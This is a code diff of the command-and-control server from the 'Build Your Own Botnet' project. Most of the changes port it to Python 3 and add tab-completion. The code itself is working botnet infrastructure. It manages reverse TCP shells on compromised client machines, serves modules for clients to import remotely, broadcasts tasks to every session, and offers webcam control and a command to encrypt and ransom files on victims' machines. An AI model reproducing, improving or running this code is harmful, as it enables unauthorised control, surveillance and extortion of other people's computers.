@@ -8,21 +8,23 @@ import os
 import sys
 import time
 import json
-import Queue
-import string
+import base64
 import pickle
 import socket
 import struct
-import base64
 import random
 import inspect
-import logging
 import argparse
 import datetime
 import threading
 import subprocess
 import collections
-import multiprocessing
+
+http_serv_mod = "SimpleHTTPServer"
+if sys.version_info[0] > 2:
+    http_serv_mod = "http.server"
+    sys.path.append('core')
+    sys.path.append('modules')
 
 # modules
 import core.util as util
@@ -48,7 +50,7 @@ except NameError:
 __threads = {}
 __abort = False
 __debug = False
-__banner__ = """ 
+__banner__ = """
 
 88                                  88
 88                                  88
@@ -68,8 +70,8 @@ def main():
 
     parser = argparse.ArgumentParser(
         prog='server.py',
-        version='0.1.5',
-        description="Command & Control Server (Build Your Own Botnet)")
+        description="Command & Control Server (Build Your Own Botnet)"
+    )
 
     parser.add_argument(
         '--host',
@@ -116,9 +118,15 @@ def main():
         help='Additional logging'
     )
 
+    parser.add_argument(
+        '-v', '--version',
+        action='version',
+        version='0.5',
+    )
+
     modules = os.path.abspath('modules')
     site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
-        
+
     if len(site_packages):
         n = 0
         globals()['packages'] = site_packages[0]
@@ -137,23 +145,23 @@ def main():
             util.log("Unable to create directory 'data' (permission denied)")
 
     options = parser.parse_args()
-
+    tmp_file=open("temp","w")
     globals()['debug'] = options.debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
 
 class C2():
-    """ 
+    """
     Console-based command & control server with a streamlined user-interface for controlling clients
     with reverse TCP shells which provide direct terminal access to the client host machines, as well
     as handling session authentication & management, serving up any scripts/modules/packages requested
     by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
     incoming completed tasks from clients
-    
+
     """
 
     _lock = threading.Lock()
@@ -163,7 +171,7 @@ class C2():
     _prompt_style = 'BRIGHT'
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
-        """ 
+        """
         Create a new Command & Control server
 
         `Optional`
@@ -172,7 +180,7 @@ class C2():
                                 *.db     (persistent)
 
         Returns a byob.server.C2 instance
-        
+
         """
         self._active = threading.Event()
         self._count = 1
@@ -248,6 +256,15 @@ class C2():
                 'usage': 'tasks [id]',
                 'description': 'display all incomplete tasks for a client (default: all clients)'}}
 
+        try:
+            import readline
+        except ImportError:
+            util.log("Warning: missing package 'readline' is required for tab-completion")
+        else:
+            import rlcompleter
+            readline.parse_and_bind("tab: complete")
+            readline.set_completer(self._completer)
+
     def _print(self, info):
         lock = self.current_session._lock if self.current_session else self._lock
         if isinstance(info, str):
@@ -269,11 +286,11 @@ class C2():
                             if len(str(info.get(key))) > 80:
                                 info[key] = str(info.get(key))[:77] + '...'
                             info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
-                            util.display('\x20' * 4, end=',')
+                            util.display('\x20' * 4, end=' ')
                             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
             with lock:
-                util.display('\x20' * 4, end=',')
+                util.display('\x20' * 4, end=' ')
                 util.display(str(info), color=self._text_color, style=self._text_style)
 
     def _socket(self, port):
@@ -288,12 +305,12 @@ class C2():
         with lock:
             if data:
                 util.display('\n{}\n'.format(data))
-            util.display(prompt, end=',')
+            util.display(prompt, end=' ')
 
     def _banner(self):
         with self._lock:
             util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
-            util.display("[?] ", color='yellow', style='bright', end=',')
+            util.display("[?] ", color='yellow', style='bright', end=' ')
             util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
         return __banner__
 
@@ -321,22 +338,28 @@ class C2():
                     session = s
                     break
             else:
-                util.log("session not found for: {}".format(peer))
+                util.log("Session not found for: {}".format(peer))
         else:
             util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return session
+
+    def _completer(self, text, state):
+        options = [i for i in self.commands.keys() if i.startswith(text)]
+        if state < len(options):
+            return options[state]
+        return None
 
     def _get_prompt(self, data):
         with self._lock:
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
     def debug(self, code):
-        """ 
+        """
         Execute code directly in the context of the currently running process
 
         `Requires`
         :param str code:    Python code to execute
-        
+
         """
         if globals()['debug']:
             try:
@@ -347,14 +370,14 @@ class C2():
             util.log("Debugging mode is disabled")
 
     def quit(self):
-        """ 
+        """
         Quit server and optionally keep clients alive
-        
+
         """
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
         globals()['post_handler'].terminate()
-        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
+        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
                     try:
@@ -368,26 +391,26 @@ class C2():
         sys.exit(0)
 
     def help(self, info=None):
-        """ 
+        """
         Show usage information
 
         `Optional`
-        :param dict info:   client usage help
-        
+        :param str info:   client usage help
+
         """
         column1 = 'command <arg>'
         column2 = 'description'
-        info = info if info else {command['usage']: command['description'] for command in self.commands.values()}
-        max_key = max(map(len, info.keys() + [column1])) + 2
-        max_val = max(map(len, info.values() + [column2])) + 2
-        util.display('\n', end=',')
+        info = json.loads(info) if info else {command['usage']: command['description'] for command in self.commands.values()}
+        max_key = max(map(len, list(info.keys()) + [column1])) + 2
+        max_val = max(map(len, list(info.values()) + [column2])) + 2
+        util.display('\n', end=' ')
         util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
-        util.display("\n", end=',')
+        util.display("\n", end=' ')
 
     def display(self, info):
-        """ 
+        """
         Display formatted output in the console
 
         `Required`
@@ -409,12 +432,17 @@ class C2():
                     self._print(json.loads(info))
                 except:
                     util.display(str(info), color=self._text_color, style=self._text_style)
+            elif isinstance(info, bytes):
+                try:
+                    self._print(json.load(info))
+                except:
+                    util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
             else:
-                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
             print()
 
     def query(self, statement):
-        """ 
+        """
         Query the database
 
         `Requires`
@@ -426,22 +454,22 @@ class C2():
     def settings(self):
         """
         Show the server's currently configured settings
-        
+
         """
         text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
         text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
         prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
         prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
         util.display('\n\t    OPTIONS', color='white', style='bright')
-        util.display('text color/style: ', color='white', style='normal', end=',')
+        util.display('text color/style: ', color='white', style='normal', end=' ')
         util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
-        util.display('prompt color/style: ', color='white', style='normal', end=',')
+        util.display('prompt color/style: ', color='white', style='normal', end=' ')
         util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
-        util.display('debug: ', color='white', style='normal', end=',')
+        util.display('debug: ', color='white', style='normal', end=' ')
         util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')
 
     def set(self, args=None):
-        """ 
+        """
         Set display settings for the command & control console
 
         Usage: `set [setting] [option]=[value]`
@@ -472,7 +500,7 @@ class C2():
                             globals()['debug'] = False
                         elif setting.lower() in ('1','on','true','enable'):
                             globals()['debug'] = True
-                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=',')
+                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
                         util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
                         return
                 for setting, option in arguments.kwargs.items():
@@ -484,7 +512,7 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._prompt_style = option
-                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=',')
+                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
                         util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                         return
                     elif target == 'text':
@@ -494,18 +522,18 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._text_style = option
-                        util.display("\ntext color/style changed to ", color='white', style='bright', end=',')
+                        util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
                         util.display(option + '\n', color=self._text_color, style=self._text_style)
                         return
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
 
     def task_list(self, id=None):
-        """ 
+        """
         List client tasks and results
 
         `Requires`
         :param int id:   session ID
-        
+
         """
         if globals()['debug']:
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
@@ -515,11 +543,11 @@ class C2():
             print()
             for task in tasks:
                 util.display(tasks.index(task) + 1)
-                self.database._display(task)        
+                self.database._display(task)
             print()
 
     def task_broadcast(self, command):
-        """ 
+        """
         Broadcast a task to all sessions
 
         `Requires`
@@ -539,7 +567,7 @@ class C2():
         self._return()
 
     def session_webcam(self, args=''):
-        """ 
+        """
         Interact with a client webcam
 
         `Optional`
@@ -599,7 +627,7 @@ class C2():
         return result
 
     def session_remove(self, session_id):
-        """ 
+        """
         Shutdown client shell and remove client from database
 
         `Requires`
@@ -649,7 +677,7 @@ class C2():
                 return self.run()
 
     def session_list(self, verbose=True):
-        """ 
+        """
         List currently online clients
 
         `Optional`
@@ -666,7 +694,7 @@ class C2():
             print()
 
     def session_ransom(self, args=None):
-        """ 
+        """
         Encrypt and ransom files on client machine
 
         `Required`
@@ -684,7 +712,7 @@ class C2():
             util.log("No client selected")
 
     def session_shell(self, session):
-        """ 
+        """
         Interact with a client session through a reverse TCP shell
 
         `Requires`
@@ -707,7 +735,7 @@ class C2():
             return self.current_session.run()
 
     def session_background(self, session=None):
-        """ 
+        """
         Send a session to background
 
         `Requires`
@@ -734,6 +762,7 @@ class C2():
             self.database.update_status(session.get('uid'), 0)
             session['online'] = False
             self.sessions[session.get('id')] = { "info": session, "connection": None }
+            self._count += 1
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
@@ -741,27 +770,27 @@ class C2():
                 info = self.database.handle_session(session.info)
                 if isinstance(info, dict):
                     if info.pop('new', False):
-                        util.display("\n\n[+]", color='green', style='bright', end=',')
-                        util.display("New Connection:", color='white', style='bright', end=',')
+                        util.display("\n\n[+]", color='green', style='bright', end=' ')
+                        util.display("New Connection:", color='white', style='bright', end=' ')
                         util.display(address[0], color='white', style='normal')
-                        util.display("    Session:", color='white', style='bright', end=',')
+                        util.display("    Session:", color='white', style='bright', end=' ')
                         util.display(str(session.id), color='white', style='normal')
-                        util.display("    Started:", color='white', style='bright', end=',')
+                        util.display("    Started:", color='white', style='bright', end=' ')
                         util.display(time.ctime(session._created), color='white', style='normal')
                         self._count += 1
                     else:
-                        util.display("\n\n[+]", color='green', style='bright', end=',')
-                        util.display("{} reconnected".format(address[0]), color='white', style='bright', end=',')
+                        util.display("\n\n[+]", color='green', style='bright', end=' ')
+                        util.display("{} reconnected".format(address[0]), color='white', style='bright', end=' ')
                     session.info = info
                     self.sessions[int(session.id)] = session
             else:
-                util.display("\n\n[-]", color='red', style='bright', end=',')
-                util.display("Failed Connection:", color='white', style='bright', end=',')
+                util.display("\n\n[-]", color='red', style='bright', end=' ')
+                util.display("Failed Connection:", color='white', style='bright', end=' ')
                 util.display(address[0], color='white', style='normal')
 
             # refresh prompt
             prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
-            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
+            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=' ')
             sys.stdout.flush()
 
             abort = globals()['__abort']
@@ -770,7 +799,7 @@ class C2():
 
     @util.threaded
     def serve_resources(self):
-        """ 
+        """
         Handles serving modules and packages in a seperate thread
 
         """
@@ -778,10 +807,10 @@ class C2():
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
     def run(self):
-        """ 
+        """
         Run C2 server administration terminal
 
         """
@@ -790,8 +819,6 @@ class C2():
         self._active.set()
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
-        if 'resources' not in globals()['__threads']:
-            globals()['__threads']['resources'] = self.serve_resources()
         while True:
             try:
                 self._active.wait()
@@ -824,16 +851,16 @@ class C2():
 
 
 class Session(threading.Thread):
-    """ 
+    """
     A subclass of threading.Thread that is designed to handle an
-    incoming connection by creating an new authenticated session 
+    incoming connection by creating an new authenticated session
     for the encrypted connection of the reverse TCP shell
 
     """
 
     def __init__(self, connection=None, id=1):
         """
-        Create a new Session 
+        Create a new Session
 
         `Requires`
         :param connection:  socket.socket object
@@ -851,7 +878,7 @@ class Session(threading.Thread):
         self.id = id
         self.connection = connection
         self.key = security.diffiehellman(self.connection)
-        self.rsa = security.Cryptodome.PublicKey.RSA.generate(2048)
+        self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
         try:
             self.info = self.recv_task()
             self.info['id'] = self.id
@@ -860,7 +887,7 @@ class Session(threading.Thread):
             return
 
     def kill(self):
-        """ 
+        """
         Kill the reverse TCP shell session
 
         """
@@ -874,7 +901,7 @@ class Session(threading.Thread):
         """
         Get information about the client host machine
         to identify the session
-        
+
         """
         header_size = struct.calcsize("!L")
         header = self.connection.recv(header_size)
@@ -882,12 +909,14 @@ class Session(threading.Thread):
         msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
+        for item in [item for item in info if "_b64" in str(info[item])[0:5]]:
+            info[item] = base64.b64decode(bytes(info[item][6:])).decode('ascii')
         return info
 
     def status(self):
-        """ 
+        """
         Check the status and duration of the session
-        
+
         """
         c = time.time() - float(self._created)
         data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
@@ -897,7 +926,7 @@ class Session(threading.Thread):
         return ', '.join([i for i in data if i])
 
     def send_task(self, task):
-        """ 
+        """
         Send task results to the server
 
         `Requires`
@@ -922,7 +951,7 @@ class Session(threading.Thread):
         return True
 
     def recv_task(self):
-        """ 
+        """
         Receive and decrypt incoming task from server
 
         :returns dict task:
@@ -934,7 +963,7 @@ class Session(threading.Thread):
           :attr datetime completed:  time task was completed by client
 
         """
-        
+
         header_size = struct.calcsize('!L')
         header = self.connection.recv(header_size)
         if len(header) == 4:
@@ -947,12 +976,12 @@ class Session(threading.Thread):
             return 0
 
     def run(self):
-        """ 
+        """
         Handle the server-side of the session's reverse TCP shell
 
         """
         while True:
-#            try:
+            # try:
             if self._active.wait():
                 task = self.recv_task() if not self._prompt else self._prompt
                 if isinstance(task, dict):
